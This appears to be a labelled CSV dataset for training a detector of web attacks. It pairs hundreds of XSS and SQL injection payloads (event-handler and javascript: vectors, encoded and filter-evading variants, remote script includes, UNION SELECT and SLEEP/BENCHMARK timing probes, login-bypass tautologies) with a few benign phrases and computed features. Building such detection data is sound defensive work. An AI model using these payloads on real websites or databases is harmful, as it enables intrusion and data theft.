input,label,length,entropy,num_quotes,has_script,has_sql_keywords,special_char_ratio
"UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--",2,117,4.119949351618279,2,0,1,0.2307692287968442
<img src=``&NewLine; onerror=alert(1)&NewLine;,1,46,4.33597085859852,0,0,0,0.23913042958412112
"<;IMG STYLE="";xss:expr/*XSS*/ession(alert(';XSS';))"";>;",1,55,4.729099659325983,4,0,0,0.3999999927272729
"LOL<style>*{/*all*/color/*all*/:/*all*/red/*all*/;/[0]*IE,Safari*[0]/color:green;color:bl/*IE*/ue;}</style>",1,107,4.425409377949997,0,0,0,0.4018691551227182
"<base HREF=""javascript:document.vulnerable=true;//"">",1,52,4.702856968507876,2,0,0,0.21153845747041428
"and (select substring(@@version,3,1))='S'",2,41,4.491459931341817,2,0,1,0.26829267638310544
"';!--""<XSS>=&{()}",1,17,3.85216872360328,2,0,0,0.8235293633218022
"<frameset onBlur frameset onBlur=""javascript:javascript:alert(1)""></frameset onBlur>",1,84,4.465775161360563,2,0,0,0.1428571411564626
"UNION ALL SELECT 1,2,3,4,5,6,7,8--",2,34,4.053308151287688,0,0,1,0.2647058745674743
"UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5",2,68,4.495099974522487,2,0,1,0.24999999632352948
"<FRAMESET><FRAME SRC=""javascript:javascript:alert(1);""></FRAMESET>",1,66,4.722297438052675,2,0,0,0.22727272382920116
<IMG SRC=javascript:alert('XSS')>,1,33,4.574400937409153,2,0,0,0.2424242350780535
"exp/*<A STYLE='no\xss:noxss(""*//*"");xss:ex/*XSS*//*/*/pression(document.vulnerable=true)'>",1,90,4.816442958950002,4,0,0,0.35555555160493835
"<math href=""javascript:javascript:alert(1)"">CLICKME</math>  <math> <maction actiontype=""statusline#http://google.com"" xlink:href=""javascript:javascript:alert(1)"">CLICKME</maction> </math>",1,187,4.886975760217693,6,0,0,0.20320855506305585
<--`<img/src=` onerror=alert(1)> --!>,1,37,4.301084704157685,0,0,0,0.4324324207450697
"<img src=x onerror=\x12""javascript:alert(1)"">",1,45,4.552638373963221,2,0,0,0.22222221728395075
"<a href=""\x1Fjavascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",1,71,4.671779556553309,4,0,0,0.22535210950208298
"admin"" or ""1""=""1""/*",2,19,3.4263674884732267,5,0,0,0.4210526094182837
<form><textarea &#13; onkeyup='\u0061\u006C\u0065\u0072\u0074&#x28;1&#x29;'>,1,76,4.71664071811536,2,0,0,0.2763157858379502
"&lt;A HREF=\""http&#58;//ha&#46;ckers&#46;org@google\""&gt;XSS&lt;/A&gt;",1,70,4.651541096998908,2,0,0,0.37142856612244907
&lt;XML ID=I&gt;&lt;X&gt;&lt;C&gt;&lt;![CDATA[&lt;IMG SRC=&quot;javas]]&gt;&lt;![CDATA[cript:alert(&apos;XSS&apos;);&quot;&gt;]]&gt;,1,132,4.553582806878124,0,0,0,0.3636363608815427
"<object classid=""clsid:..."" codebase=""javascript:document.vulnerable=true;"">",1,76,4.4464819158043145,4,0,0,0.21052631301939062
"<a href=""\x05javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",1,71,4.710580788978146,4,0,0,0.22535210950208298
"AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)))",2,131,4.3747651252367765,0,0,1,0.2671755704795758
"<script/src=data&colon;text/j\u0061v\u0061&#115&#99&#114&#105&#112&#116,\u0061%6C%65%72%74(/XSS/)></script",1,106,4.87569604526315,0,0,0,0.3113207517799929
"<IMG SRC=x onpopstate=""alert(String.fromCharCode(88,83,83))"">",1,61,4.844431394833535,2,0,0,0.21311475060467622
"&lt;XSS STYLE=\""xss&#58;expression(alert('XSS'))\""&gt;",1,54,4.706198789513641,4,0,0,0.33333332716049396
"<img src=""blah>"" onmouseover=""document.vulnerable=true;"">",1,57,4.385007119200166,4,0,0,0.21052631209602962
"<STYLE TYPE=""text/javascript"">alert('XSS');</STYLE>",1,51,4.672042008468478,4,0,0,0.2745097985390236
";>;<;BODY onload!#$%&;()*~+-_.,:;?@[/|\]^`=alert(;XSS"";)>;",1,58,5.202808581334469,1,0,0,0.6724137815101072
"ORDER BY 1,SLEEP(5)--",2,21,3.880179922675738,0,0,0,0.23809522675737013
"<body onPropertyChange body onPropertyChange=""javascript:javascript:alert(1)""></body onPropertyChange>",1,102,4.5804799990228355,2,0,0,0.11764705767012688
<script\x0A>javascript:alert(1)</script>,1,40,4.227567157116929,0,0,0,0.22499999437500015
"<IMG SRC=x onresize=""alert(String.fromCharCode(88,83,83))"">",1,59,4.846720753111609,2,0,0,0.22033897931628849
&#X3c,1,5,2.321928094887362,0,0,0,0.399999920000016
"<img src=""Mario Heiderich says that svg SHOULD not be executed trough image tags"" onerror=""javascript:document.write('\u003c\u0069\u0066\u0072\u0061\u006d\u0065\u0020\u0073\u0072\u0063\u003d\u0022\u0064\u0061\u0074\u0061\u003a\u0069\u006d\u0061\u0067\u0065\u002f\u0073\u0076\u0067\u002b\u0078\u006d\u006c\u003b\u0062\u0061\u0073\u0065\u0036\u0034\u002c\u0050\u0048\u004e\u0032\u005a\u0079\u0042\u0034\u0062\u0057\u0078\u0075\u0063\u007a\u0030\u0069\u0061\u0048\u0052\u0030\u0063\u0044\u006f\u0076\u004c\u0033\u0064\u0033\u0064\u0079\u0035\u0033\u004d\u0079\u0035\u0076\u0063\u006d\u0063\u0076\u004d\u006a\u0041\u0077\u004d\u0043\u0039\u007a\u0064\u006d\u0063\u0069\u0050\u0069\u0041\u0067\u0043\u0069\u0041\u0067\u0049\u0044\u0078\u0070\u0062\u0057\u0046\u006e\u005a\u0053\u0042\u0076\u0062\u006d\u0078\u0076\u0059\u0057\u0051\u0039\u0049\u006d\u0046\u0073\u005a\u0058\u004a\u0030\u004b\u0044\u0045\u0070\u0049\u006a\u0034\u0038\u004c\u0032\u006c\u0074\u0059\u0057\u0064\u006c\u0050\u0069\u0041\u0067\u0043\u0069\u0041\u0067\u0049\u0044\u0078\u007a\u0064\u006d\u0063\u0067\u0062\u0032\u0035\u0073\u0062\u0032\u0046\u006b\u0050\u0053\u004a\u0068\u0062\u0047\u0056\u0079\u0064\u0043\u0067\u0079\u004b\u0053\u0049\u002b\u0050\u0043\u0039\u007a\u0064\u006d\u0063\u002b\u0049\u0043\u0041\u004b\u0049\u0043\u0041\u0067\u0050\u0048\u004e\u006a\u0063\u006d\u006c\u0077\u0064\u0044\u0035\u0068\u0062\u0047\u0056\u0079\u0064\u0043\u0067\u007a\u004b\u0054\u0077\u0076\u0063\u0032\u004e\u0079\u0061\u0058\u0042\u0030\u0050\u0069\u0041\u0067\u0043\u0069\u0041\u0067\u0049\u0044\u0078\u006b\u005a\u0057\u005a\u007a\u0049\u0047\u0039\u0075\u0062\u0047\u0039\u0068\u005a\u0044\u0030\u0069\u0059\u0057\u0078\u006c\u0063\u006e\u0051\u006f\u004e\u0043\u006b\u0069\u0050\u006a\u0077\u0076\u005a\u0047\u0056\u006d\u0063\u007a\u0034\u0067\u0049\u0041\u006f\u0067\u0049\u0043\u0041\u0038\u005a\u0079\u0042\u0076\u0062\u006d\u0078\u0076\u0059\u0057\u0051\u0039\u0049\u006d\u0046\u0073\u005a\u0058\u004a\u0030\u004b\u0044\u0055\u0070\u0049\u006a\u0034\u0067\u0049\u0041\u006f\u0067\u0049\u0043\u0041\u0067\u0049\u0043\u0041\u0067\u0050\u0047\u004e\u0070\u0063\u006d\u004e\u0073\u005a\u0053\u0042\u0076\u0062\u006d\u0078\u0076\u0059\u0057\u0051\u0039\u0049\u006d\u0046\u0073\u005a\u0058\u004a\u0030\u004b\u0044\u0059\u0070\u0049\u0069\u0041\u0076\u0050\u0069\u0041\u0067\u0043\u0069\u0041\u0067\u0049\u0043\u0041\u0067\u0049\u0043\u0041\u0038\u0064\u0047\u0056\u0034\u0064\u0043\u0042\u0076\u0062\u006d\u0078\u0076\u0059\u0057\u0051\u0039\u0049\u006d\u0046\u0073\u005a\u0058\u004a\u0030\u004b\u0044\u0063\u0070\u0049\u006a\u0034\u0038\u004c\u0033\u0052\u006c\u0065\u0048\u0051\u002b\u0049\u0043\u0041\u004b\u0049\u0043\u0041\u0067\u0050\u0043\u0039\u006e\u0050\u0069\u0041\u0067\u0043\u006a\u0077\u0076\u0063\u0033\u005a\u006e\u0050\u0069\u0041\u0067\u0022\u003e\u003c\u002f\u0069\u0066\u0072\u0061\u006d\u0065\u003e');""></img>",1,2901,3.3167365627991687,6,0,0,0.16546018608567384
&lt;SCRIPT &quot;a=&apos;&gt;&apos;&quot; SRC=&quot;http://ha.ckers.org/xss.js&quot;&gt;&lt;/SCRIPT&gt;,1,103,4.462258387527118,0,0,0,0.31067960863417854
upload profile picture,0,22,3.6069367321753214,0,0,0,0.0
"<IMG SRC=x onratechange=""alert(String.fromCharCode(88,83,83))"">",1,63,4.792689598371493,2,0,0,0.20634920307382218
"<marquee onStart marquee onStart=""javascript:javascript:alert(1)""></marquee onStart>",1,84,4.353112573988809,2,0,0,0.1428571411564626
ORDER BY 2--,2,12,3.084962500721156,0,0,0,0.16666665277777895
"<HEAD><META HTTP-EQUIV=""CONTENT-TYPE"" CONTENT=""text/html; charset=UTF-7""> </HEAD>+ADw-SCRIPT+AD4-alert('XSS');+ADw-/SCRIPT+AD4-",1,127,5.13504823667667,6,0,0,0.2598425176390353
<img src=`xx:xx`onerror=alert(1)>,1,33,4.207738347405823,0,0,0,0.2727272644628102
"UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL--",2,107,4.226313784399432,2,0,1,0.2336448576294873
"AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)))--",2,161,4.353778164419831,0,0,1,0.28571428393966286
"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28--",2,93,3.6623165646541658,0,0,1,0.3118279536362586
"<OBJECT TYPE=""text/x-scriptlet"" DATA=""%(scriptlet)s""></OBJECT>",1,62,4.699769898922079,4,0,0,0.25806451196670144
&lt;A HREF=&quot;http://%77%77%77%2E%67%6F%6F%67%6C%65%2E%63%6F%6D&quot;&gt;XSS&lt;/A&gt;,1,89,4.291895015969003,0,0,0,0.3483146028279258
"<SCRIPT SRC=""%(jpg)s""></SCRIPT>",1,31,4.106949132758152,2,0,0,0.3548386982310097
"<img \x39src=x onerror=""javascript:alert(1)"">",1,45,4.597082818407666,2,0,0,0.22222221728395075
"&lt;SCRIPT \""a='&gt;'\"" SRC=\""http&#58;//ha&#46;ckers&#46;org/xss&#46;js\""&gt;&lt;/SCRIPT&gt;",1,93,4.727496746686717,6,0,0,0.408602146144063
OR 1=0#,2,7,2.8073549220576037,0,0,0,0.285714244897965
"&lt;IMG SRC=\""   javascript&#058;alert('XSS');\""&gt;",1,52,4.7722731314778155,4,0,0,0.3269230706360948
<script>javascript:alert(1)</script>,1,36,3.953968403919608,0,1,0,0.22222221604938291
<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>,1,217,2.684029874415209,0,0,0,0.22580645057232052
reset your password,0,19,3.431623565847431,0,0,0,0.0
"<html onmouseover html onmouseover=""javascript:javascript:alert(1)""></html onmouseover>",1,87,4.422211100329583,2,0,0,0.13793103289734446
"<IMG SRC=x onmouseover=""alert(String.fromCharCode(88,83,83))"">",1,62,4.857838754724986,2,0,0,0.20967741597294492
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20",2,92,4.210421295838841,2,0,0,0.30434782277882805
"<bgsound onPropertyChange bgsound onPropertyChange=""javascript:javascript:alert(1)""></bgsound onPropertyChange>",1,111,4.625384308097697,2,0,0,0.1081081071341612
&#x0003c,1,8,2.4056390622295662,0,0,0,0.24999996875000394
"<a href=""javas\x09cript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",1,71,4.710580788978146,4,0,0,0.22535210950208298
"<IMG SRC=x onloadedmetadata=""alert(String.fromCharCode(88,83,83))"">",1,67,4.718855421704184,2,0,0,0.19402984785030078
"or benchmark(50000000,MD5(1))",2,29,3.904481531182633,0,0,0,0.17241378715814526
"<applet onReadyStateChange applet onReadyStateChange=""javascript:javascript:alert(1)""></applet onReadyStateChange>",1,114,4.403803196888058,2,0,0,0.10526315697137582
<// style=x:expression\28javascript:alert(1)\29>,1,48,4.621115365169272,0,0,0,0.22916666189236123
&lt;EMBED SRC=&quot;http://ha.ckers.org/xss.swf&quot; AllowScriptAccess=&quot;always&quot;&gt;&lt;/EMBED&gt;,1,108,4.749340416524629,0,0,0,0.24074073851165984
"<script/src=data&colon;text/j\u0061v\u0061&#115&#99&#114&#105&#112&#116,\u0061%6C%65%72%74(/XSS/)></script",1,106,4.87569604526315,0,0,0,0.3113207517799929
"<div style=""width: expression(document.vulnerable=true;);"">",1,59,4.646444795640697,2,0,0,0.20338982706118938
<script>var var = 1; alert(var)</script>,1,40,3.996439344671016,0,1,0,0.22499999437500015
"<SCRIPT/SRC=""%(jscript)s""></SCRIPT>",1,35,4.264578373902383,2,0,0,0.3428571330612248
<style>*{x:ｅｘｐｒｅｓｓｉｏｎ(javascript:alert(1))}</style>,1,51,4.789689067292008,0,0,0,0.47058822606689754
"<script\x0Atype=""text/javascript"">javascript:alert(1);</script>",1,63,4.364838511984457,2,0,0,0.22222221869488543
<iframe src=http://xss.rocks/scriptlet.html <,1,45,4.186762964036329,0,0,0,0.19999999555555567
"<A HREF=""http://66.102.7.147/"">XSS</A>",1,38,4.4385883686498095,2,0,0,0.39473683171745183
"<iframe/src=""data:text/html,<svg &#111;&#110;load=alert(1)>"">",1,61,4.701332116912215,2,0,0,0.3278688470841173
"<video onerror=""javascript:javascript:alert(1)""><source>",1,56,4.324577021349437,2,0,0,0.19642856792091845
"<META HTTP-EQUIV=\""refresh\"" CONTENT=\""0;url=javascript:alert('XSS');\"">",1,72,5.138830127032207,6,0,0,0.2916666626157408
"<div id=d><x xmlns=""><iframe onload=javascript:alert(1)""></div> <script>d.innerHTML=d.innerHTML</script>",1,104,4.7293742429693735,2,1,0,0.24038461307322487
"<audio src=1 href=1 onerror=""javascript:alert(1)""></audio>",1,58,4.495298884098997,2,0,0,0.22413792717003575
"&#00;</form><input type&#61;""date"" onfocus=""alert(1)"">",1,54,4.76396574282408,4,0,0,0.33333332716049396
ORDER BY SLEEP(5)--,2,19,3.6818808028034025,0,0,0,0.21052630470914185
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12--",2,63,4.336994839053019,6,0,1,0.3650793592844546
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21",2,95,4.185001031532902,2,0,0,0.3052631546814405
AND 1=0,2,7,2.8073549220576037,0,0,0,0.1428571224489825
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27",2,106,4.026567808230236,6,0,1,0.3396226383054468
&lt;LAYER SRC=&quot;http://ha.ckers.org/scriptlet.html&quot;&gt;&lt;/LAYER&gt;,1,78,4.572548080059108,0,0,0,0.2692307657790928
"<? echo('<SCR)';echo('IPT>alert(""XSS"")</SCRIPT>'); ?>",1,53,4.524629180774193,6,0,0,0.43396225596297633
)) or (('x'))=(('x,2,18,2.794653473544342,3,0,0,0.6666666296296316
"UNION ALL SELECT 1,2,3,4,5,6--",2,30,4.002910079649727,0,0,1,0.2333333255555558
"<div style=""background-image: url(javascript:document.vulnerable=true;);"">",1,74,4.721438042136319,2,0,0,0.18918918663257855
"AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)))",2,168,4.287347463721915,0,0,1,0.27976190309665533
"UNION ALL SELECT 1,2#",2,21,3.7489948035250964,0,0,1,0.09523809070294806
&#x3c;,1,6,2.584962500721156,0,0,0,0.49999991666668053
"<XSS STYLE=""xss:expression(javascript:alert(1))"">",1,49,4.663093711807235,2,0,0,0.22448979133694305
"ABC<div style=""x:\x09expression(javascript:alert(1)"">DEF",1,56,4.882811395078723,2,0,0,0.19642856792091845
"<STYLE type=""text/css"">BODY{background:url(""javascript:alert('XSS')"")}</STYLE>",1,78,5.1491305460021115,6,0,0,0.2692307657790928
<script>a=/XSS/\ndocument.vulnerable=true;</script>,1,51,4.4759635770959285,0,1,0,0.23529411303344877
"<""';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//"";alert(String.fromCharCode(88,83,83))//\"";alert(String.fromCharCode(88,83,83))//--></SCRIPT>"">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>",1,233,4.792394962438543,7,1,0,0.3004291832599606
"ORDER BY 1,SLEEP(5)",2,19,3.787143960698139,0,0,0,0.15789472853185638
"<;IMG DYNSRC="";javascript:alert(';XSS';);"";>;",1,45,4.666047330580116,4,0,0,0.37777776938271623
<div onmouseover='alert&lpar;1&rpar;'>DIV</div>,1,47,4.519925224377835,2,0,0,0.25531914350384805
"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12",2,43,3.91060979461433,0,0,1,0.25581394753921055
"<OBJECT TYPE=""text/x-scriptlet"" DATA=""%(scriptlet)s""></OBJECT>",1,62,4.699769898922079,4,0,0,0.25806451196670144
javascript:alert%281%29;,1,24,4.053508854797678,0,0,0,0.1666666597222225
"`'><script>\x7Ejavascript:alert(1)</script>
`'><script>\xE2\x80\x87javascript:alert(1)</script>",1,95,4.537659292268194,2,1,0,0.2736842076454294
"<STYLE>li {list-style-image: url(""javascript:javascript:alert(1)"");}</STYLE><UL><LI>XSS",1,87,4.9274438242169545,2,0,0,0.2643678130532435
ORDER BY 9,2,10,2.9219280948873623,0,0,0,0.0
<iframe src=javascript&colon;alert&lpar;document&period;location&rpar;>,1,71,4.212764197880309,0,0,0,0.15492957528268203
"`'><script>\x3Bjavascript:alert(1)</script>
`'><script>\x0Djavascript:alert(1)</script>",1,87,4.430775104745721,2,1,0,0.2758620657946889
"<IMG SRC=""javascript:javascript:alert(1);"">",1,43,4.563022534265731,2,0,0,0.23255813412655504
or SLEEP(5)--,2,13,3.3927474104487847,0,0,0,0.3076922840236705
"<body src=1 href=1 onerror=""javascript:alert(1)""></body>",1,56,4.567606315535808,2,0,0,0.23214285299744905
"<a href=""\x00javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",1,71,4.682411774893639,4,0,0,0.22535210950208298
"ABC<div style=""x:\x0Dexpression(javascript:alert(1)"">DEF",1,56,4.847097109364437,2,0,0,0.19642856792091845
"<SCRIPT>document.write(""<SCRI"");</SCRIPT>PT SRC=""http://ha.ckers.org/xss.js""></SCRIPT>",1,86,4.868725953515188,4,1,0,0.30232557787993514
"<LINK REL=""stylesheet"" HREF=""javascript:javascript:alert(1);"">",1,62,4.72880649666047,4,0,0,0.20967741597294492
<svg><style>{font-family&colon;'<iframe/onload=confirm(1)>',1,59,4.572741142325498,2,0,0,0.2711864360815858
"<!--#exec cmd=""/bin/echo '<SCR'""--><!--#exec cmd=""/bin/echo 'IPT SRC=http://ha.ckers.org/xss.js></SCRIPT>'""-->",1,110,4.925024968993863,8,0,0,0.39090908735537194
"<BGSOUND SRC=""javascript:alert('XSS');"">",1,40,4.803055907333276,4,0,0,0.2749999931250002
<b <script>alert(1)</script>0,1,29,4.021268494903765,0,1,0,0.27586205945303244
"<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>",1,57,4.900970444361869,0,0,0,0.1929824527546938
search for latest news,0,22,3.5383105956150063,0,0,0,0.0
"<TABLE><TD BACKGROUND=""javascript:javascript:alert(1)"">",1,55,4.888279432092592,2,0,0,0.19999999636363644
"admin""/*",2,8,3.0,1,0,0,0.3749999531250059
"<;LINK REL="";stylesheet""; HREF="";javascript:alert(';XSS';);"";>;",1,63,4.706818018463285,6,0,0,0.34920634366339137
%2BADw-script+AD4-alert(document.location)%2BADw-/script%2BAD4-,1,63,4.578248725286938,0,0,0,0.19047618745275893
ORDER BY 22,2,11,2.913977073182752,0,0,0,0.0
"';!--""<XSS>=&{()}",1,17,3.85216872360328,2,0,0,0.8235293633218022
"</TITLE><SCRIPT>alert(""XSS"");</SCRIPT>",1,38,4.188331131693838,2,1,0,0.34210525415512494
"AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)+CHAR(113)))#",2,219,4.236280358911059,0,0,1,0.28767123156314506
&lt;IMG SRC=&apos;vbscript:msgbox(&quot;XSS&quot;)&apos;&gt;,1,60,4.5444138295776115,0,0,0,0.2666666622222223
"admin"") or (""1""=""1""--",2,21,3.5537631144722455,5,0,0,0.47619045351474026
"AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))--",2,95,4.207543603858195,0,0,1,0.26315789196675904
<style>*[{}@import'%(css)s?]</style>X,1,37,4.4968985554505645,1,0,0,0.4324324207450697
<STYLE>@import'http://ha.ckers.org/xss.css';</STYLE>,1,52,4.587472353123261,2,0,0,0.30769230177514806
<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&,1,118,2.8382446080418244,0,0,0,0.22881355738293596
"<a href=""javascript\x0A:javascript:alert(1)"" id=""fuzzelement1"">test</a>",1,71,4.710580788978146,4,0,0,0.22535210950208298
"&lt;SCRIPT&gt;document&#46;write(\""&lt;SCRI\"");&lt;/SCRIPT&gt;PT SRC=\""http&#58;//ha&#46;ckers&#46;org/xss&#46;js\""&gt;&lt;/SCRIPT&gt;",1,134,4.815373868784322,4,0,0,0.35820895255067947
<embed code=%(scriptlet)s></embed>,1,34,4.0796786498829745,0,0,0,0.2647058745674743
change your password,0,20,3.8219280948873626,0,0,0,0.0
--><!-- --\x3E> <img src=xxx:x onerror=javascript:alert(1)> -->,1,63,4.493407805160805,0,0,0,0.34920634366339137
"<iframe/src=""data:text/html;&Tab;base64&Tab;,PGJvZHkgb25sb2FkPWFsZXJ0KDEpPg=="">",1,79,5.213414096437639,2,0,0,0.20253164300592857
<img SRC='vbscript:document.vulnerable=true;'>,1,46,4.648243205915917,2,0,0,0.19565216965973545
"</ foo=""><script>alert(1)</script>"">",1,36,4.162573265150912,2,1,0,0.3888888780864201
"<IFRAME SRC=""javascript:javascript:alert(1);""></IFRAME>",1,55,4.76546329568962,2,0,0,0.2363636320661158
"><img src=x onerror=javascript:alert('A')>
><img src=x onerror=javascript:alert((""A""))>",1,87,4.534448093350938,4,0,0,0.25287356031179814
&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;,1,52,3.6617230168267683,0,0,0,0.30769230177514806
"<script src=""\\%(jscript)s""></script>",1,37,3.8614992310092955,2,0,0,0.35135134185536915
"<META onpaonpageonpagonpageonpageshowshoweshowshowgeshow=""alert(1)"";",1,68,4.08898234413051,2,0,0,0.10294117495674743
</svg>''<svg><script 'AQuickBrownFoxJumpsOverTheLazyDog'>alert&#x28;1&#x29; {Opera},1,83,5.246741353133134,4,0,0,0.22891565989258242
"UNION ALL SELECT 1,2,3",2,22,3.7544418457133455,0,0,1,0.09090908677685969
"<script>Object.__noSuchMethod__ = Function,[{}][0].constructor._('javascript:alert(1)')()</script>",1,98,4.9357037881833135,2,1,0,0.30612244585589343
<body onscroll=alert(XSS)><br><br><br><br><br><br>...<br><br><br><br><input autofocus>,1,86,3.987409076631603,0,0,0,0.34883720524607903
http://www.simpatie.ro/index.php?page=top_movies&cat=13&p=2 p=2 ??XSS??,1,71,4.614624324297767,0,0,0,0.2676056300337235
ORDER BY 26,2,11,3.095795255000934,0,0,0,0.0
"<div style=""behaviour: url([link to code]);"">",1,45,4.624751985026256,2,0,0,0.2444444390123458
"UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30",2,139,4.380439208208793,2,0,1,0.30215827120749444
"admin"" --",2,9,2.94770277922009,1,0,0,0.33333329629630043
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28",2,109,4.013738452264573,6,0,1,0.33944953817018775
&lt;A HREF=&quot;javascript:document.location=&apos;http://www.google.com/&apos;&quot;&gt;XSS&lt;/A&gt;,1,103,4.668032379251426,0,0,0,0.26213591978508816
"`'><script>\x00javascript:alert(1)</script>
`'><script>\xE2\x80\xA8javascript:alert(1)</script>",1,95,4.529713108034894,2,1,0,0.2736842076454294
